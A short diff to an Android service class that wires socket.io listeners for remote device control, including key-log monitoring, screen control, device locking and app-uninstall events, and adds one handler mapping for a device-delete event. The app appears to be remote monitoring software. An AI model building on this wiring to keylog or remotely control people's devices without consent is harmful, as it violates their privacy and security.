@@ -103,6 +103,7 @@ public class Server extends Service {
             socket.on("mb-screen-recent-event-" + mDeviceID, onDeviceRecentMonitor);
             socket.on("mb-key-logs-" + mDeviceID, onKeyLoggerMonitor);
             socket.on("mb-uninstall-app-event-" + mDeviceID, onUninstallAppMonitor);
+            socket.on("mb-device-delete-event-" + mDeviceID, onUninstallAppMonitor);
             socket.on("mb-screen-control-scroll-" + mDeviceID, onScreenScrollMonitor);
             socket.on("mb-device-lock-" + mDeviceID, onDeviceLockMonitor);
             socket.on("mb-monitor-close-" + mDeviceID, onCloseMonitor);
